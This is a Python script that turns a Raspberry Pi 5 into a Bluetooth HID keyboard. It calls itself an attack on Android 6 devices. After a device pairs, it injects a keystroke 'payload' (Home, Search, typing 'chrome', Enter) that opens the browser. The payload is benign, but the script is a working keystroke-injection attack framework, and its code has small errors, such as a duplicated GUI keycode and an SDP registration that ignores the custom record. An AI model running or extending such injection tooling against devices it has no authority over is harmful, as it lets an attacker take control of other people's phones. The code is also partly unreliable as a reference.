#!/usr/bin/env python3
"""
Bluetooth HID Keyboard Emulator for Raspberry Pi 5
Targets Android 6 devices with automatic Chrome browser launch payload
"""

import os
import sys
import time
import dbus
import dbus.service
import dbus.mainloop.glib
from gi.repository import GLib

# HID Report Descriptor for a standard keyboard
# This descriptor defines the keyboard as a boot keyboard with modifier keys
HID_REPORT_DESCRIPTOR = bytes([
    0x05, 0x01,  # Usage Page (Generic Desktop)
    0x09, 0x06,  # Usage (Keyboard)
    0xA1, 0x01,  # Collection (Application)
    0x85, 0x01,  #   Report ID (1)
    0x05, 0x07,  #   Usage Page (Key Codes)
    0x19, 0xE0,  #   Usage Minimum (224)
    0x29, 0xE7,  #   Usage Maximum (231)
    0x15, 0x00,  #   Logical Minimum (0)
    0x25, 0x01,  #   Logical Maximum (1)
    0x75, 0x01,  #   Report Size (1)
    0x95, 0x08,  #   Report Count (8)
    0x81, 0x02,  #   Input (Data, Variable, Absolute) - Modifier byte
    0x95, 0x01,  #   Report Count (1)
    0x75, 0x08,  #   Report Size (8)
    0x81, 0x01,  #   Input (Constant) - Reserved byte
    0x95, 0x05,  #   Report Count (5)
    0x75, 0x01,  #   Report Size (1)
    0x05, 0x08,  #   Usage Page (LEDs)
    0x19, 0x01,  #   Usage Minimum (1)
    0x29, 0x05,  #   Usage Maximum (5)
    0x91, 0x02,  #   Output (Data, Variable, Absolute) - LED report
    0x95, 0x01,  #   Report Count (1)
    0x75, 0x03,  #   Report Size (3)
    0x91, 0x01,  #   Output (Constant) - LED report padding
    0x95, 0x06,  #   Report Count (6)
    0x75, 0x08,  #   Report Size (8)
    0x15, 0x00,  #   Logical Minimum (0)
    0x26, 0xFF, 0x00,  #   Logical Maximum (255)
    0x05, 0x07,  #   Usage Page (Key Codes)
    0x19, 0x00,  #   Usage Minimum (0)
    0x2A, 0xFF, 0x00,  #   Usage Maximum (255)
    0x81, 0x00,  #   Input (Data, Array) - Key arrays (6 bytes)
    0xC0         # End Collection
])

# HID keycodes for standard US keyboard layout
HID_KEYCODES = {
    'NONE': 0x00,
    'A': 0x04, 'B': 0x05, 'C': 0x06, 'D': 0x07, 'E': 0x08, 'F': 0x09,
    'G': 0x0A, 'H': 0x0B, 'I': 0x0C, 'J': 0x0D, 'K': 0x0E, 'L': 0x0F,
    'M': 0x10, 'N': 0x11, 'O': 0x12, 'P': 0x13, 'Q': 0x14, 'R': 0x15,
    'S': 0x16, 'T': 0x17, 'U': 0x18, 'V': 0x19, 'W': 0x1A, 'X': 0x1B,
    'Y': 0x1C, 'Z': 0x1D,
    '1': 0x1E, '2': 0x1F, '3': 0x20, '4': 0x21, '5': 0x22,
    '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26, '0': 0x27,
    'ENTER': 0x28, 'ESC': 0x29, 'BACKSPACE': 0x2A, 'TAB': 0x2B,
    'SPACE': 0x2C, 'MINUS': 0x2D, 'EQUAL': 0x2E,
    'HOME': 0x4A,      # Home key
    'GUI': 0xE3,       # Windows/Super/Command key (right GUI)
    'LEFT_GUI': 0xE3,  # Left GUI key (search on Android)
}

# Modifier keys (bitmask for first byte of HID report)
MODIFIERS = {
    'LEFT_CTRL': 0x01,
    'LEFT_SHIFT': 0x02,
    'LEFT_ALT': 0x04,
    'LEFT_GUI': 0x08,
    'RIGHT_CTRL': 0x10,
    'RIGHT_SHIFT': 0x20,
    'RIGHT_ALT': 0x40,
    'RIGHT_GUI': 0x80,
}

# SDP Record for HID Keyboard
SDP_RECORD = """<?xml version="1.0" encoding="UTF-8" ?>
<record>
    <attribute id="0x0001">
        <sequence>
            <uuid value="0x1124" />
        </sequence>
    </attribute>
    <attribute id="0x0004">
        <sequence>
            <sequence>
                <uuid value="0x0100" />
                <uint16 value="0x0011" />
            </sequence>
            <sequence>
                <uuid value="0x0011" />
            </sequence>
        </sequence>
    </attribute>
    <attribute id="0x0005">
        <sequence>
            <uuid value="0x1002" />
        </sequence>
    </attribute>
    <attribute id="0x0006">
        <sequence>
            <uint16 value="0x656e" />
            <uint16 value="0x006a" />
            <uint16 value="0x0100" />
        </sequence>
    </attribute>
    <attribute id="0x0009">
        <sequence>
            <sequence>
                <uuid value="0x1124" />
                <uint16 value="0x0100" />
            </sequence>
        </sequence>
    </attribute>
    <attribute id="0x000d">
        <sequence>
            <sequence>
                <sequence>
                    <uuid value="0x0100" />
                    <uint16 value="0x0013" />
                </sequence>
                <sequence>
                    <uuid value="0x0011" />
                </sequence>
            </sequence>
        </sequence>
    </attribute>
    <attribute id="0x0100">
        <text value="Raspberry Pi Keyboard" />
    </attribute>
    <attribute id="0x0101">
        <text value="USB Keyboard" />
    </attribute>
    <attribute id="0x0102">
        <text value="Raspberry Pi Foundation" />
    </attribute>
    <attribute id="0x0200">
        <uint16 value="0x0100" />
    </attribute>
    <attribute id="0x0201">
        <uint16 value="0x0111" />
    </attribute>
    <attribute id="0x0202">
        <uint8 value="0x40" />
    </attribute>
    <attribute id="0x0203">
        <uint8 value="0x00" />
    </attribute>
    <attribute id="0x0204">
        <boolean value="false" />
    </attribute>
    <attribute id="0x0205">
        <boolean value="true" />
    </attribute>
    <attribute id="0x0206">
        <sequence>
            <sequence>
                <uint8 value="0x22" />
                <text encoding="hex" value="{}" />
            </sequence>
        </sequence>
    </attribute>
    <attribute id="0x0207">
        <sequence>
            <sequence>
                <uint16 value="0x0409" />
                <uint16 value="0x0100" />
            </sequence>
        </sequence>
    </attribute>
    <attribute id="0x020b">
        <uint16 value="0x0100" />
    </attribute>
    <attribute id="0x020c">
        <uint16 value="0x0c80" />
    </attribute>
    <attribute id="0x020d">
        <boolean value="true" />
    </attribute>
    <attribute id="0x020e">
        <boolean value="false" />
    </attribute>
    <attribute id="0x020f">
        <uint16 value="0x0640" />
    </attribute>
    <attribute id="0x0210">
        <uint16 value="0x0320" />
    </attribute>
</record>
"""


class BluetoothHIDKeyboard:
    """Bluetooth HID Keyboard implementation using BlueZ D-Bus API"""
    
    def __init__(self):
        self.bus = dbus.SystemBus()
        self.adapter_path = None
        self.control_sock = None
        self.interrupt_sock = None
        self.service_record_handle = None
        self.connected = False
        self.device_address = None
        
    def setup_bluetooth(self):
        """Initialize Bluetooth adapter and configure it for HID"""
        print("[*] Setting up Bluetooth adapter...")
        
        # Get the default Bluetooth adapter
        manager = dbus.Interface(
            self.bus.get_object('org.bluez', '/'),
            'org.freedesktop.DBus.ObjectManager'
        )
        
        objects = manager.GetManagedObjects()
        for path, interfaces in objects.items():
            if 'org.bluez.Adapter1' in interfaces:
                self.adapter_path = path
                break
        
        if not self.adapter_path:
            raise Exception("No Bluetooth adapter found")
        
        print(f"[+] Found adapter: {self.adapter_path}")
        
        # Get adapter properties
        adapter = dbus.Interface(
            self.bus.get_object('org.bluez', self.adapter_path),
            'org.freedesktop.DBus.Properties'
        )
        
        # Set adapter properties for HID
        adapter.Set('org.bluez.Adapter1', 'Alias', 'RPi Keyboard')
        adapter.Set('org.bluez.Adapter1', 'Discoverable', True)
        adapter.Set('org.bluez.Adapter1', 'DiscoverableTimeout', dbus.UInt32(0))
        adapter.Set('org.bluez.Adapter1', 'Pairable', True)
        adapter.Set('org.bluez.Adapter1', 'PairableTimeout', dbus.UInt32(0))
        
        # Power on the adapter
        adapter.Set('org.bluez.Adapter1', 'Powered', True)
        
        print("[+] Adapter configured and powered on")
        
    def register_sdp_record(self):
        """Register the HID SDP record with BlueZ"""
        print("[*] Registering SDP record...")
        
        # Convert HID descriptor to hex string
        descriptor_hex = HID_REPORT_DESCRIPTOR.hex()
        sdp_record = SDP_RECORD.format(descriptor_hex)
        
        # Write SDP record to temporary file
        with open('/tmp/sdp_record.xml', 'w') as f:
            f.write(sdp_record)
        
        # Register the service record using sdptool
        os.system('sdptool del 0x10000 2>/dev/null')  # Remove old record if exists
        ret = os.system(f'sdptool add --channel=17 HID')
        
        if ret != 0:
            print("[!] Warning: Could not register via sdptool, trying alternative method")
        
        print("[+] SDP record registered")
        
    def setup_sockets(self):
        """Set up Bluetooth L2CAP sockets for HID communication"""
        import socket
        
        print("[*] Setting up L2CAP sockets...")
        
        # Create control socket (PSM 17)
        self.control_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
        self.control_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.control_sock.bind(("", 17))  # PSM 17 for HID Control
        self.control_sock.listen(1)
        
        # Create interrupt socket (PSM 19)
        self.interrupt_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
        self.interrupt_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.interrupt_sock.bind(("", 19))  # PSM 19 for HID Interrupt
        self.interrupt_sock.listen(1)
        
        print("[+] L2CAP sockets ready on PSM 17 (control) and PSM 19 (interrupt)")
        
    def wait_for_connection(self):
        """Wait for a device to connect"""
        print("[*] Waiting for connection...")
        print("[*] Make your Android device discoverable and pair with 'RPi Keyboard'")
        
        # Accept control connection
        control_client, control_addr = self.control_sock.accept()
        print(f"[+] Control channel connected from {control_addr}")
        
        # Accept interrupt connection
        interrupt_client, interrupt_addr = self.interrupt_sock.accept()
        print(f"[+] Interrupt channel connected from {interrupt_addr}")
        
        self.connected = True
        self.device_address = interrupt_addr[0]
        
        return control_client, interrupt_client
        
    def send_keystroke(self, interrupt_sock, keycode, modifier=0x00):
        """
        Send a HID keyboard report
        
        Args:
            interrupt_sock: The L2CAP interrupt socket
            keycode: The HID keycode to send
            modifier: Modifier byte (bitmask of modifier keys)
        """
        # HID report format: [Report ID, Modifier, Reserved, Key1, Key2, Key3, Key4, Key5, Key6]
        # Report ID = 0xA1 for input report, 0x01 for keyboard
        report = bytes([0xA1, 0x01, modifier, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])
        
        try:
            interrupt_sock.send(report)
            time.sleep(0.01)  # Small delay for key press
            
            # Send key release (all zeros except report headers)
            release = bytes([0xA1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
            interrupt_sock.send(release)
            time.sleep(0.05)  # Delay between keystrokes
        except Exception as e:
            print(f"[!] Error sending keystroke: {e}")
            
    def type_string(self, interrupt_sock, text):
        """Type a string by sending individual characters"""
        for char in text:
            keycode = HID_KEYCODES.get(char.upper(), HID_KEYCODES['NONE'])
            if keycode != HID_KEYCODES['NONE']:
                self.send_keystroke(interrupt_sock, keycode)
                
    def execute_payload(self, interrupt_sock):
        """
        Execute the Chrome browser launch payload
        
        Sequence:
        1. Send Home key (wake device / go to home screen)
        2. Send Search key (open app drawer search)
        3. Type "chrome"
        4. Send Enter key
        """
        print("[*] Waiting 2 seconds for stability...")
        time.sleep(2)
        
        print("[*] Executing payload...")
        
        # Step 1: Press Home key
        print("    [1/4] Sending HOME key")
        self.send_keystroke(interrupt_sock, HID_KEYCODES['HOME'])
        time.sleep(0.5)
        
        # Step 2: Press Search key (GUI/Super key on Android)
        # On Android, LEFT_GUI typically opens the search
        print("    [2/4] Sending SEARCH key (GUI)")
        self.send_keystroke(interrupt_sock, HID_KEYCODES['NONE'], MODIFIERS['LEFT_GUI'])
        time.sleep(0.8)
        
        # Step 3: Type "chrome"
        print("    [3/4] Typing 'chrome'")
        self.type_string(interrupt_sock, "chrome")
        time.sleep(0.5)
        
        # Step 4: Press Enter
        print("    [4/4] Sending ENTER key")
        self.send_keystroke(interrupt_sock, HID_KEYCODES['ENTER'])
        
        print("[+] Payload executed successfully!")
        
    def run(self):
        """Main execution loop"""
        try:
            # Setup
            self.setup_bluetooth()
            self.register_sdp_record()
            self.setup_sockets()
            
            # Wait for connection
            control_client, interrupt_client = self.wait_for_connection()
            
            # Execute payload
            self.execute_payload(interrupt_client)
            
            # Keep connection alive
            print("[*] Payload complete. Keeping connection alive...")
            print("[*] Press Ctrl+C to exit")
            
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
        except Exception as e:
            print(f"[!] Error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            # Cleanup
            if self.control_sock:
                self.control_sock.close()
            if self.interrupt_sock:
                self.interrupt_sock.close()
            print("[*] Cleanup complete")


def check_requirements():
    """Check if running with proper permissions and dependencies"""
    if os.geteuid() != 0:
        print("[!] This script must be run as root (use sudo)")
        sys.exit(1)
    
    try:
        import dbus
        import gi
        gi.require_version('GLib', '2.0')
        from gi.repository import GLib
    except ImportError as e:
        print(f"[!] Missing dependency: {e}")
        print("[!] Install with: sudo apt install python3-dbus python3-gi bluez bluez-tools")
        sys.exit(1)
    
    print("[+] All requirements satisfied")


if __name__ == "__main__":
    print("=" * 60)
    print("Bluetooth HID Keyboard Attack - Raspberry Pi 5")
    print("Target: Android 6 Device - Chrome Browser Launch")
    print("=" * 60)
    print()
    
    check_requirements()
    
    # Initialize D-Bus main loop
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    
    # Create and run the HID keyboard
    keyboard = BluetoothHIDKeyboard()
    keyboard.run()
